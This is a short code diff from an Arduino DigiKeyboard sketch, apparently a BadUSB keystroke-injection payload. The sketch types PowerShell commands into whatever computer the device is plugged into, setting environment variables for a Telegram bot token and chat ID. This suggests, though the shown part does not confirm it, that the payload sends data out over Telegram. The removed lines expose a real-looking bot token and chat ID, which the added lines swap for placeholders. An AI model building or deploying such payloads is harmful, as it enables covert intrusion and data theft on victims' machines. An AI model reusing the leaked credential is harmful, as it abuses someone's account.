@@ -9,11 +9,11 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
 
-  DigiKeyboard.print("$env:TK='8941312536:AAGrAQZuGvs_H2muueIXTZOHUzK_1Ctbohw'");
+  DigiKeyboard.print("$env:TK='Your bot tokken'");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
-  DigiKeyboard.print("$env:CI='-5268156839'");
+  DigiKeyboard.print("$env:CI='-Chat Id'");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
